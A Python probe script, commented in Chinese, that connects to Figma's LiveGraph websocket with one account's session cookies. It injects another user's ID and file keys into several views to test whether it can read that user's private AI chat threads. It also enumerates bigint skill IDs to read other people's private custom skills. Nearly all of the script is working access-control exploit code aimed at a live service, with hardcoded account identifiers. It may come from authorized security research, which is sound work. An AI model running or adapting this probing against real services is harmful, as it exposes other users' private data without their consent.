# -*- coding: utf-8 -*-
"""目标驱动探针: 两个未测过的参数注入面
1. PaginatedUserAiChatThreadsView (ownerId+userId 双参数, 无 dZ 根过滤)
   -> B 身份注入 A_UID: 若返回 A 的 AI 会话列表(含最新消息) = 越权
2. NodeAiChatThreadsBySessionView (ownerId+nodeGuid+externalSessionId, 无 dZ)
   -> B 身份注入 A_UID + A 文件节点: 若返回 A 的节点会话 = 越权
3. CustomSkillDetailView (skillId 是 bigint 可枚举, 根 filter 无 dZ)
   -> 小整数判定 ID 空间; 命中则枚举读他人私有技能 body
对照: B 身份查 B 自己, 确认 view 正常工作
"""
import sys, json, io, asyncio, time, urllib.parse, uuid, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import websockets

B_UID = "1667396392129259941"
A_UID = "1666382703778278399"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"
A_DESIGN = "5Gs4PaTz11Hlk2sqVnidBG"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"


def make_abs_pure(cookie, keep_uid):
    parts = {}
    for p in cookie.split("; "):
        if "=" in p:
            k, v = p.split("=", 1)
            parts[k] = v
    d = json.loads(urllib.parse.unquote(parts.get("__Host-figma.authn", "")))
    d = {k: v for k, v in d.items() if k == keep_uid}
    parts["__Host-figma.authn"] = urllib.parse.quote(json.dumps(d, separators=(",", ":")))
    if "__Host-figma.embed" in parts:
        try:
            ne = json.loads(urllib.parse.unquote(parts["__Host-figma.embed"]))
            ne = {k: v for k, v in ne.items() if k == keep_uid}
            if ne:
                parts["__Host-figma.embed"] = urllib.parse.quote(json.dumps(ne, separators=(",", ":")))
            else:
                del parts["__Host-figma.embed"]
                parts.pop("__Host-figma.embed.mac", None)
        except Exception:
            pass
    return "; ".join(f"{k}={v}" for k, v in parts.items())


rawB = io.open("ws_cookie_B_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
ABS_B = make_abs_pure(rawB, B_UID)

OUT = io.open("_ws_ai_skill_out.txt", "w", encoding="utf-8")


def lg_url(fk, uid):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId={uid}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{fk}"
            f"&connectionType=initial&reconnect=0")


async def sub(view, args, fk, wait=9):
    frames = []
    try:
        async with websockets.connect(lg_url(fk, B_UID),
                                      additional_headers={"User-Agent": UA, "Cookie": ABS_B,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=30) as ws:
            await ws.send(json.dumps({"messageType": "auth", "clientType": "web",
                                      "args": {"userId": B_UID, "anonymousUserId": None},
                                      "tags": {"clientType": "web",
                                               "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                                               "clientUrl": f"https://www.figma.com/file/{fk}"},
                                      "clientRequestedVersion": 2}))
            for _ in range(3):
                m = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(m, str) and "authSuccess" in m:
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": view,
                                      "viewHash": "0" * 32, "loadType": "initial",
                                      "args": args}))
            deadline = time.time() + wait
            while time.time() < deadline:
                try:
                    m = await asyncio.wait_for(ws.recv(), timeout=3)
                except asyncio.TimeoutError:
                    continue
                if isinstance(m, str):
                    frames.append(m)
                    if "viewLoaded" in m or "viewSubscriptionFailed" in m:
                        break
    except Exception as e:
        return [f"ERR {type(e).__name__}: {str(e)[:80]}"]
    return frames


async def run_case(label, view, args, fk=A_MAKE):
    frames = await sub(view, args, fk, wait=9)
    txt = " ".join(frames)
    has_data = any('"initial":{' in f and '"initial":{}' not in f for f in frames)
    m = re.search(r'Status code = (\d+). Error message = .*?"message":"([^"]*)"', txt)
    if has_data:
        tag = "⭐返回数据"
    elif m:
        tag = f"⚠{m.group(1)} {m.group(2)[:50]}"
    elif any("argument error" in f for f in frames):
        tag = "⚠参数错误"
    elif any("error" in f.lower() for f in frames):
        tag = "⚠有错误"
    else:
        tag = "空壳"
    print(f"[{label}] {tag} 帧数={len(frames)}")
    OUT.write(f"\n===== [{label}] {view} {tag} =====\n")
    for f in frames:
        OUT.write(f"  {f[:2000]}\n")
        if has_data:
            print(f"  🖼 {f[:1500]}")


async def main():
    print("=== 1) PaginatedUserAiChatThreadsView (ownerId+userId 注入) ===")
    await run_case("B→A_UID 会话列表", "PaginatedUserAiChatThreadsView",
                   {"ownerId": A_UID, "userId": A_UID, "firstPageSize": 25,
                    "__requestId": str(uuid.uuid4())})
    await asyncio.sleep(0.4)
    await run_case("对照 B→B_UID", "PaginatedUserAiChatThreadsView",
                   {"ownerId": B_UID, "userId": B_UID, "firstPageSize": 25,
                    "__requestId": str(uuid.uuid4())})
    await asyncio.sleep(0.4)

    print("\n=== 2) NodeAiChatThreadsBySessionView (ownerId+nodeGuid 注入) ===")
    await run_case("B→A_UID+节点", "NodeAiChatThreadsBySessionView",
                   {"ownerId": A_UID, "nodeGuid": "0:1", "externalSessionId": None,
                    "__requestId": str(uuid.uuid4())})
    await asyncio.sleep(0.4)
    await run_case("B→A_UID+随机节点", "NodeAiChatThreadsBySessionView",
                   {"ownerId": A_UID, "nodeGuid": str(uuid.uuid4()),
                    "__requestId": str(uuid.uuid4())})
    await asyncio.sleep(0.4)

    print("\n=== 3) CustomSkillDetailView (skillId bigint 枚举判定) ===")
    for sid in ["1", "10", "100", "1000"]:
        await run_case(f"skillId={sid}", "CustomSkillDetailView",
                       {"skillId": sid, "__requestId": str(uuid.uuid4())})
        await asyncio.sleep(0.3)

    OUT.close()


asyncio.run(main())
